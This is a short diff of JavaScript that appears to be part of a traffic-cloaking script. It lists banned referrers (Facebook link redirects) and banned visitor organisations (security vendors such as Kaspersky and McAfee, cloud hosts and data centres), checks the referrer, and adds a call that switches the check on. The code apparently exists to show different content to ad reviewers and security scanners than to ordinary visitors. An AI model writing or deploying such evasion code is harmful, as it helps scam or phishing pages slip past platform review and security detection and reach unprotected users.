@@ -3,6 +3,7 @@ var bannedrefs = ['l.facebook.com/l.php','facebook.com/lsr.php','fb.me'];
 var bannedorgs = ['facebook','kaspersy','mcafee','amazon','microsoft corporation','digital ocean','incorporated','inc.','radore','netvision','veri merkezi','data center','mcafee'];
 var referrer = document.referrer.toLowerCase();
 var org = "";
+checkRef();
 
 function isChromium(){
   if(!navigator || !navigator.plugins || navigator.plugins.length == 0){
